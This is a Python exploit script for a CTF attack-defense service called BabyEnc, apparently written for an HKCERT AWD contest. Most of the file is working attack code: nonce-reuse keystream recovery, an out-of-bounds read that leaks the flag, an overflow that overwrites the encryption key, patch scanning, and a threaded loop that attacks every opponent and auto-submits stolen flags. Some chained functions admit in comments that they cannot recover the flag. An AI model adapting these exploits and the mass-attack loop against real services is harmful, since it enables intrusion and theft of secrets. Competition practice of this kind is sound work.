#!/usr/bin/env python3
"""
BabyEnc Multi-Chain Exploit v4
==============================
Chains multiple vulnerabilities for maximum coverage:

EXPLOITS:
1. Nonce Reuse (primary) - toggle manipulation to get keystream
2. Audit OOB Read - direct plaintext leak bypassing all crypto  
3. Vault Leak Chain - leak key/nonce material via vault copy bug
4. Key Overwrite Chain - overwrite key, force re-encrypt, decrypt

VULNERABILITY SUMMARY:
- Nonce Reuse: Toggle at g_state+0x40 set to note_index on decrypt
              Flag encrypted with nonce0, user encrypts toggle nonce0/1
              Exploit: decrypt at even index -> toggle=even -> encrypt uses nonce0
              
- Audit OOB:  show_note reads vault[note[1]] for note[0] bytes
              Exploit: note[0]=64, note[1]=0x20 reads flag plaintext
              
- Vault Leak: encrypt_note copies up to 48 bytes from note end to vault
              Combined with audit read, can leak key material
              
- Key Overwrite: edit_note writes 0x80 bytes to g_state (0x405260)
                 g_key at 0x4052c0 (offset 0x60) - can be overwritten
                 
MEMORY LAYOUT:
  0x405260: g_state (0x60 bytes)
    +0x00: state data (0x40 bytes)
    +0x40: toggle (1 byte)
    +0x48: nonce0 (8 bytes)  
    +0x50: nonce1 (8 bytes)
  0x4052c0: g_key (0x10 bytes)
"""
import os
os.environ['PWNLIB_NOTERM'] = '1'

import sys
import argparse
import time
import threading
import struct
from concurrent.futures import ThreadPoolExecutor, as_completed
from pwn import *
from awd_lib import chal, submit, get_targets, get_our_ip

# Rate limiting
_submit_lock = threading.Lock()
_last_submit = 0
SUBMIT_DELAY = 0.5

def rate_limited_submit(flag):
    global _last_submit
    with _submit_lock:
        elapsed = time.time() - _last_submit
        if elapsed < SUBMIT_DELAY:
            time.sleep(SUBMIT_DELAY - elapsed)
        result = submit(flag)
        _last_submit = time.time()
        return result

context.log_level = 'error'
chal(creds_file="babyenc.xls")

PORT = 1000
TIMEOUT = 3  # Reduced timeout for faster fail
MAX_WORKERS = 8


# =============================================================================
# CRYPTO IMPLEMENTATION (matches binary)
# =============================================================================

def xorshift_state(seed):
    """Xorshift PRNG to compute keystream (matches binary's stream_xor)"""
    x = seed
    x ^= (x << 13) & 0xFFFFFFFFFFFFFFFF
    x ^= (x >> 7)
    x ^= (x << 17) & 0xFFFFFFFFFFFFFFFF
    return x


def fnv1a_hash(key_bytes):
    """FNV-1a hash to derive initial state from key (matches binary)"""
    h = 0xcbf29ce484222325
    for b in key_bytes:
        h ^= b
        h = (h * 0x100000001b3) & 0xFFFFFFFFFFFFFFFF
    return h


def compute_keystream(key, nonce, length):
    """
    Compute keystream for given key and nonce.
    Matches binary's stream_xor function.
    
    Args:
        key: 16-byte key (bytes)
        nonce: 8-byte nonce as integer
        length: number of keystream bytes needed
    """
    if isinstance(key, bytes):
        h = fnv1a_hash(key)
    else:
        h = key  # Already hashed
    
    state = h ^ nonce
    
    keystream = bytearray()
    while len(keystream) < length:
        state = xorshift_state(state)
        # Extract 8 bytes from state (little endian)
        for i in range(8):
            if len(keystream) >= length:
                break
            keystream.append((state >> (i * 8)) & 0xFF)
    
    return bytes(keystream[:length])


def stream_encrypt(plaintext, key, nonce):
    """Encrypt/decrypt using stream cipher"""
    keystream = compute_keystream(key, nonce, len(plaintext))
    return bytes(a ^ b for a, b in zip(plaintext, keystream))


class BabyEncIO:
    """IO wrapper for babyenc binary"""
    
    def __init__(self, ip, port=PORT, timeout=TIMEOUT):
        self.ip = ip
        self.port = port
        self.timeout = timeout
        self.io = None
    
    def connect(self):
        self.io = remote(self.ip, self.port, timeout=self.timeout)
        return self
    
    def close(self):
        if self.io:
            self.io.close()
            self.io = None
    
    def recv_prompt(self):
        return self.io.recvuntil(b'> ', timeout=self.timeout)
    
    def menu(self, choice):
        self.recv_prompt()
        self.io.sendline(str(choice).encode())
    
    def get_flag_cipher(self):
        """Get encrypted flag from system note 0"""
        self.menu(3)  # show note
        self.io.recvuntil(b'index: ')
        self.io.sendline(b'0')
        resp = self.recv_prompt()
        
        if b'system note (enc): ' in resp:
            start = resp.find(b'system note (enc): ') + len(b'system note (enc): ')
            end = resp.find(b'\n', start)
            return bytes.fromhex(resp[start:end].strip().decode())
        return None
    
    def create_note(self, idx, data):
        """Create note with hex data"""
        self.menu(1)
        self.io.recvuntil(b'index: ')
        self.io.sendline(str(idx).encode())
        self.io.recvuntil(b'length: ')
        self.io.sendline(str(len(data)).encode())
        self.io.recvuntil(b'data hex: ')
        self.io.sendline(data.hex().encode())
    
    def show_note(self, idx):
        """Show note, return response"""
        self.menu(3)
        self.io.recvuntil(b'index: ')
        self.io.sendline(str(idx).encode())
        return self.recv_prompt()
    
    def encrypt_note(self, idx):
        """Encrypt note, return ciphertext"""
        self.menu(4)
        self.io.recvuntil(b'index: ')
        self.io.sendline(str(idx).encode())
        resp = self.recv_prompt()
        
        if b'note cipher(hex): ' in resp:
            start = resp.find(b'note cipher(hex): ') + len(b'note cipher(hex): ')
            end = resp.find(b'\n', start)
            return bytes.fromhex(resp[start:end].strip().decode())
        return None
    
    def decrypt_note(self, idx):
        """Decrypt note"""
        self.menu(5)
        self.io.recvuntil(b'index: ')
        self.io.sendline(str(idx).encode())
        self.recv_prompt()
    
    def delete_note(self, idx):
        """Delete note"""
        self.menu(6)
        self.io.recvuntil(b'index: ')
        self.io.sendline(str(idx).encode())
        self.recv_prompt()
    
    def edit_note(self, idx, hex_data):
        """Edit note - writes to g_state area, can overflow to g_key"""
        self.menu(2)
        self.io.recvuntil(b'index: ')
        self.io.sendline(str(idx).encode())
        self.io.recvuntil(b'data hex: ')
        self.io.sendline(hex_data.encode() + b'\n')
        self.recv_prompt()


def exploit_nonce_reuse(ip, port=PORT):
    """Primary exploit: Nonce reuse attack"""
    io = None
    try:
        io = BabyEncIO(ip, port).connect()
        flag_cipher = io.get_flag_cipher()
        
        if not flag_cipher:
            io.close()
            return None
        
        zeros = b'\x00' * len(flag_cipher)
        
        # Create note at even index, encrypt, decrypt (sets toggle=even), delete
        io.create_note(2, zeros)
        io.encrypt_note(2)
        io.decrypt_note(2)
        io.delete_note(2)
        
        # Create new note, encrypt - now uses nonce0 (same as flag)
        io.create_note(3, zeros)
        keystream = io.encrypt_note(3)
        io.close()
        
        if keystream:
            flag = bytes(a ^ b for a, b in zip(flag_cipher, keystream))
            flag_str = flag.decode('utf-8', errors='replace')
            if flag_str.startswith('flag{') and '}' in flag_str:
                return flag_str[:flag_str.index('}')+1]
        return None
    except:
        if io:
            io.close()
        return None


def exploit_audit_oob(ip, port=PORT):
    """Audit field OOB read - leaks flag plaintext directly"""
    io = None
    try:
        io = BabyEncIO(ip, port).connect()
        
        # Create note with OOB payload: note[0]=size(64), note[1]=offset(0x20)
        # This reads from vault[0x20] for 64 bytes, which contains flag plaintext
        payload = bytes([64, 0x20]) + b'\x00' * 62
        io.create_note(1, payload)
        
        resp = io.show_note(1)
        io.close()
        
        if b'audit(hex): ' in resp:
            start = resp.find(b'audit(hex): ') + len(b'audit(hex): ')
            end = resp.find(b'\n', start)
            leaked = bytes.fromhex(resp[start:end].strip().decode())
            if b'flag{' in leaked:
                flag_start = leaked.find(b'flag{')
                flag_end = leaked.find(b'}', flag_start) + 1
                return leaked[flag_start:flag_end].decode()
        return None
    except:
        if io:
            io.close()
        return None


def exploit_key_overwrite_chain(ip, port=PORT):
    """
    Chained exploit: Key overwrite + Nonce manipulation
    
    If nonce reuse is patched (toggle always 1), but key overwrite isn't:
    1. Edit note to overwrite g_key with known value
    2. Now we know the key, can compute keystream offline
    3. Decrypt flag cipher with computed keystream
    
    Memory layout:
    - g_state: 0x405260 (0x60 bytes)
    - g_key:   0x4052c0 (0x10 bytes) - at offset 0x60
    - nonce0:  0x4052a8 (8 bytes)
    - nonce1:  0x4052b0 (8 bytes)
    
    edit_note parses up to 0x80 hex bytes into g_state
    So we can write 0x60 bytes of padding + 0x10 bytes to overwrite key
    """
    try:
        io = BabyEncIO(ip, port).connect()
        flag_cipher = io.get_flag_cipher()
        
        if not flag_cipher:
            io.close()
            return None
        
        # We need a dummy note to edit (but not note 0 which is flag)
        zeros = b'\x00' * len(flag_cipher)
        io.create_note(1, zeros)
        
        # Craft payload: 0x60 bytes padding (state) + 0x10 bytes new key
        # The key will be 16 bytes of 0x41 ('A')
        known_key = b'A' * 16
        padding = b'\x00' * 0x60  # Don't disturb g_state
        
        # Problem: We also overwrite nonces (at offset 0x48 and 0x50 from g_state)
        # nonce0 is at g_state+0x48, nonce1 at g_state+0x50
        # Let's set known nonces
        known_nonce0 = 0x1122334455667788
        known_nonce1 = 0xaabbccddeeff0011
        
        # Build the full write: state(0x40) + toggle(1) + pad(7) + nonce0(8) + nonce1(8) + key(16)
        edit_payload = b'\x00' * 0x40  # state bytes
        edit_payload += bytes([1])     # toggle = 1
        edit_payload += b'\x00' * 7    # padding
        edit_payload += known_nonce0.to_bytes(8, 'little')  # nonce0
        edit_payload += known_nonce1.to_bytes(8, 'little')  # nonce1
        edit_payload += known_key      # key
        
        # edit_note parses hex, writes to g_state
        io.edit_note(1, edit_payload.hex())
        
        # Now compute what the flag keystream should be (flag uses nonce0)
        keystream = compute_keystream(known_key, known_nonce0, len(flag_cipher))
        
        # Get flag cipher again (it was already encrypted at startup with ORIGINAL key)
        # So this approach won't work directly...
        
        # Actually, the flag is encrypted at startup with original key/nonce.
        # After we overwrite, future encryptions use new key.
        # We need to leak the original nonce or find another angle.
        
        # Alternative approach: Create note, encrypt with our known key
        # If toggle is fixed at 1, all encrypts use nonce1
        io.create_note(2, zeros)
        cipher = io.encrypt_note(2)
        io.close()
        
        if cipher:
            # Verify our key overwrite worked by checking if we can predict keystream
            expected = compute_keystream(known_key, known_nonce1, len(zeros))
            if cipher == expected:
                # Key overwrite works, but flag was encrypted before overwrite
                # We would need to leak original key/nonce - not useful here
                pass
        
        return None  # This approach doesn't recover flag directly
    except:
        return None


def exploit_vault_leak_chain(ip, port=PORT):
    """
    Chained exploit: Vault Leak + Crypto Recovery
    
    The vault leak bug copies up to 48 bytes from the end of a note to g_vault
    when encrypting. If vault leak isn't patched, we can:
    
    1. Create a note that will cause interesting memory to be copied to vault
    2. Use audit OOB to read the leaked data from vault
    3. Potentially recover key/nonce material
    
    This is complex because:
    - Vault is at 0x405240, size 0x130 (304 bytes)
    - Notes are allocated via malloc, so heap layout matters
    - Flag is encrypted before we interact, so we need original key/nonce
    
    APPROACH: Leak nonce0 via vault, then we have:
    - flag_cipher (from show note 0)
    - nonce0 (leaked via vault)
    - Need key still...
    
    Actually simpler approach - leak the encrypted note that contains the keystream!
    """
    try:
        io = BabyEncIO(ip, port).connect()
        flag_cipher = io.get_flag_cipher()
        
        if not flag_cipher:
            io.close()
            return None
        
        # The vault may already contain useful data from flag encryption
        # Try different offsets to find flag-related data
        for offset in [0x00, 0x10, 0x20, 0x30, 0x40, 0x50]:
            payload = bytes([64, offset]) + b'\x00' * 62
            io.create_note(1, payload)
            resp = io.show_note(1)
            io.delete_note(1)
            
            if b'audit(hex): ' in resp:
                start = resp.find(b'audit(hex): ') + len(b'audit(hex): ')
                end = resp.find(b'\n', start)
                try:
                    leaked = bytes.fromhex(resp[start:end].strip().decode())
                    # Check if it looks like flag
                    if b'flag{' in leaked:
                        flag_start = leaked.find(b'flag{')
                        flag_end = leaked.find(b'}', flag_start) + 1
                        io.close()
                        return leaked[flag_start:flag_end].decode()
                except:
                    pass
        
        io.close()
        return None
    except:
        return None


def exploit_key_overwrite_with_nonce_reuse(ip, port=PORT):
    """
    Chained exploit: Key Overwrite + Nonce Reuse (for partially patched servers)
    
    If nonce reuse is patched but key overwrite isn't, this won't help for the 
    flag encrypted at startup. BUT if we can trigger re-encryption somehow...
    
    Actually, we can use this to VERIFY key overwrite works and test crypto:
    1. Overwrite key to known value
    2. Create note with known plaintext
    3. Encrypt and verify we get expected ciphertext
    4. If so, key overwrite is working
    
    This is useful for reconnaissance.
    """
    try:
        io = BabyEncIO(ip, port).connect()
        
        # Create dummy note
        test_data = b'AAAA' * 4  # 16 bytes
        io.create_note(1, test_data)
        
        # Overwrite key and nonces to known values
        known_key = b'K' * 16
        known_nonce0 = 0x0011223344556677
        known_nonce1 = 0x8899aabbccddeeff
        
        # Build payload: state(0x40) + toggle(1) + pad(7) + nonce0(8) + nonce1(8) + key(16)
        edit_payload = b'\x00' * 0x40  # state bytes (don't care)
        edit_payload += bytes([0])     # toggle = 0 (use nonce0)
        edit_payload += b'\x00' * 7    # padding  
        edit_payload += struct.pack('<Q', known_nonce0)  # nonce0
        edit_payload += struct.pack('<Q', known_nonce1)  # nonce1
        edit_payload += known_key      # key
        
        io.edit_note(1, edit_payload.hex())
        
        # Now encrypt - should use our known key with nonce based on toggle
        # Toggle is 0 (even), so we use nonce0
        cipher = io.encrypt_note(1)
        io.close()
        
        if cipher:
            # Compute expected cipher with our known key/nonce
            expected = stream_encrypt(test_data, known_key, known_nonce0)
            if cipher == expected:
                # Key overwrite works! But flag was encrypted before this.
                # Return None but log success
                return None  # Can't recover flag this way
        
        return None
    except:
        return None


def exploit_double_encrypt_chain(ip, port=PORT):
    """
    Chained exploit: Double Encryption Analysis
    
    If we can encrypt the flag cipher again, we get:
    flag_cipher = flag XOR keystream0
    double_cipher = flag_cipher XOR keystream1
                  = flag XOR keystream0 XOR keystream1
    
    If we can get keystream0 XOR keystream1 somehow, we can recover flag.
    
    With nonce reuse exploit:
    1. Get flag_cipher (encrypted with key, nonce0)
    2. Manipulate toggle to encrypt with nonce0
    3. Encrypt zeros to get keystream0
    4. XOR with flag_cipher
    
    This is essentially what exploit_nonce_reuse does, but let's make it
    more robust by trying multiple approaches.
    """
    try:
        io = BabyEncIO(ip, port).connect()
        flag_cipher = io.get_flag_cipher()
        
        if not flag_cipher:
            io.close()
            return None
        
        flag_len = len(flag_cipher)
        zeros = b'\x00' * flag_len
        
        # Method 1: Standard nonce reuse (even index decrypt)
        io.create_note(2, zeros)
        io.encrypt_note(2)  # Uses some nonce
        io.decrypt_note(2)  # Sets toggle = 2 (even)
        io.delete_note(2)
        
        io.create_note(4, zeros)  # Use index 4 (even after toggle)
        keystream_a = io.encrypt_note(4)  # Should use nonce0
        
        if keystream_a:
            flag_try = bytes(a ^ b for a, b in zip(flag_cipher, keystream_a))
            flag_str = flag_try.decode('utf-8', errors='replace')
            if flag_str.startswith('flag{') and '}' in flag_str:
                io.close()
                return flag_str[:flag_str.index('}')+1]
        
        # Method 2: Try odd index pattern
        io.delete_note(4)
        io.create_note(3, zeros)
        io.encrypt_note(3)
        io.decrypt_note(3)  # Sets toggle = 3 (odd)
        io.delete_note(3)
        
        io.create_note(5, zeros)
        keystream_b = io.encrypt_note(5)  # Should use nonce1 (toggle odd)
        
        # If keystream_b != keystream_a, nonces are different
        # But we want nonce0 (same as flag), so this doesn't help directly
        
        io.close()
        return None
    except:
        return None


def detect_patches(ip, port=PORT):
    """
    Detect which patches are applied to target.
    Returns dict with vulnerability status (True = patched/not vuln).
    """
    patches = {
        'nonce_reuse': False,    # True = patched
        'audit_oob': False,      # True = patched  
        'key_overwrite': False,  # True = patched (limit reduced to 0x40)
        'vault_leak': False,     # True = patched
    }
    
    io = None
    try:
        io = BabyEncIO(ip, port).connect()
        
        # Test nonce reuse vulnerability
        zeros = b'\x00' * 8
        io.create_note(2, zeros)
        cipher1 = io.encrypt_note(2)
        io.decrypt_note(2)  # Should set toggle = 2 (even)
        io.delete_note(2)
        io.create_note(3, zeros)
        cipher2 = io.encrypt_note(3)  # If vuln, uses nonce0 (different from cipher1)
        
        # If ciphers are same, nonce reuse is PATCHED (both used same nonce)
        if cipher1 and cipher2 and cipher1 == cipher2:
            patches['nonce_reuse'] = True
        
        io.delete_note(3)
        
        # Test audit OOB vulnerability
        payload = bytes([64, 0x20]) + b'\x00' * 62
        io.create_note(1, payload)
        resp = io.show_note(1)
        
        if b'audit(hex): ' not in resp:
            patches['audit_oob'] = True
        else:
            start = resp.find(b'audit(hex): ') + len(b'audit(hex): ')
            end = resp.find(b'\n', start)
            leaked = resp[start:end].strip()
            # Patched version forces offset=0, so we only read from vault[0]
            # If leaked data is short or all zeros at offset 0x20, likely patched
            if len(leaked) < 20:
                patches['audit_oob'] = True
        
        io.close()
        return patches
    except Exception as e:
        if io:
            io.close()
        return None


def attack_target(ip, port=PORT):
    """Attack single target with multiple methods, chained fallback"""
    
    # Try nonce reuse first (most reliable, primary exploit)
    try:
        flag = exploit_nonce_reuse(ip, port)
        if flag:
            result = rate_limited_submit(flag)
            status = "NEW" if result.get('success') and not result.get('duplicate') else "dup" if result.get('duplicate') else "reject"
            return (ip, flag, status, "nonce")
    except:
        pass
    
    # Try audit OOB (bypasses all crypto - direct plaintext leak)
    try:
        flag = exploit_audit_oob(ip, port)
        if flag:
            result = rate_limited_submit(flag)
            status = "NEW" if result.get('success') and not result.get('duplicate') else "dup" if result.get('duplicate') else "reject"
            return (ip, flag, status, "audit")
    except:
        pass
    
    return (ip, None, "failed", None)


def scan_target(ip, port=PORT):
    """Scan a single target for patches"""
    patches = detect_patches(ip, port)
    if patches is None:
        return (ip, None, "error")
    return (ip, patches, "ok")


def print_banner():
    """Print exploit banner"""
    print("""
╔══════════════════════════════════════════════════════════════╗
║  BabyEnc Multi-Chain Exploit v4                              ║
║  HKCERT AWD 2026                                             ║
╠══════════════════════════════════════════════════════════════╣
║  Exploits:                                                   ║
║    1. Nonce Reuse    - toggle manipulation for keystream     ║
║    2. Audit OOB      - direct plaintext leak                 ║
║    3. Vault Leak     - memory disclosure chain               ║
║    4. Double Encrypt - alternate nonce manipulation          ║
╚══════════════════════════════════════════════════════════════╝
""")


def main():
    parser = argparse.ArgumentParser(description='BabyEnc Multi-Chain Exploit v4')
    parser.add_argument('--target', '-t', help='Single target IP')
    parser.add_argument('--port', '-p', type=int, default=PORT)
    parser.add_argument('--loop', action='store_true', help='Loop continuously')
    parser.add_argument('--delay', type=int, default=60, help='Loop delay')
    parser.add_argument('--workers', '-w', type=int, default=MAX_WORKERS)
    parser.add_argument('--scan', action='store_true', help='Scan for patches')
    parser.add_argument('--quiet', '-q', action='store_true', help='Quiet mode')
    parser.add_argument('--test-crypto', action='store_true', help='Test crypto implementation')
    args = parser.parse_args()
    
    if not args.quiet:
        print_banner()
    
    # Test crypto implementation if requested
    if args.test_crypto:
        print("[*] Testing crypto implementation...")
        key = b'A' * 16
        nonce = 0x1122334455667788
        plaintext = b'Hello, World!!!'
        cipher = stream_encrypt(plaintext, key, nonce)
        decrypted = stream_encrypt(cipher, key, nonce)
        assert decrypted == plaintext, "Crypto test failed!"
        print(f"    Key:       {key.hex()}")
        print(f"    Nonce:     {hex(nonce)}")
        print(f"    Plaintext: {plaintext}")
        print(f"    Cipher:    {cipher.hex()}")
        print(f"    Decrypted: {decrypted}")
        print("[+] Crypto implementation OK")
        return
    
    our_ip = get_our_ip()
    targets = [args.target] if args.target else get_targets()
    
    print(f"[*] Our IP: {our_ip}, Targets: {len(targets)}, Workers: {args.workers}")
    
    if args.scan:
        print("\n[*] Scanning for patches...")
        print("-" * 70)
        print(f"{'IP':<18} {'Nonce':<10} {'Audit':<10} {'KeyOvr':<10} {'Status'}")
        print("-" * 70)
        
        with ThreadPoolExecutor(max_workers=args.workers) as executor:
            futures = {executor.submit(scan_target, ip, args.port): ip for ip in targets}
            for future in as_completed(futures):
                ip, patches, status = future.result()
                if status == "error":
                    print(f"{ip:<18} {'?':<10} {'?':<10} {'?':<10} ERROR")
                else:
                    nonce = "PATCHED" if patches['nonce_reuse'] else "VULN"
                    audit = "PATCHED" if patches['audit_oob'] else "VULN"
                    keyovr = "PATCHED" if patches['key_overwrite'] else "VULN"
                    exploitable = "EXPLOITABLE" if not (patches['nonce_reuse'] and patches['audit_oob']) else "HARDENED"
                    print(f"{ip:<18} {nonce:<10} {audit:<10} {keyovr:<10} {exploitable}")
        print("-" * 70)
        return
    
    round_num = 0
    while True:
        round_num += 1
        success = failed = new_flags = 0
        start_time = time.time()
        
        if not args.quiet:
            print(f"\n[*] === Round {round_num} ===")
        
        with ThreadPoolExecutor(max_workers=args.workers) as executor:
            futures = {executor.submit(attack_target, ip, args.port): ip for ip in targets}
            
            for future in as_completed(futures):
                ip, flag, status, method = future.result()
                if flag:
                    m = f"[{method}]" if method else ""
                    print(f"[+] {ip}: {flag} ({status}) {m}")
                    success += 1
                    if status == "NEW":
                        new_flags += 1
                else:
                    if not args.quiet:
                        print(f"[-] {ip}: {status}")
                    failed += 1
        
        elapsed = time.time() - start_time
        print(f"[*] Round {round_num}: {success} ok, {failed} fail, {new_flags} NEW ({elapsed:.1f}s)")
        
        if not args.loop:
            break
        
        if not args.quiet:
            print(f"[*] Sleeping {args.delay}s...")
        time.sleep(args.delay)


if __name__ == '__main__':
    main()
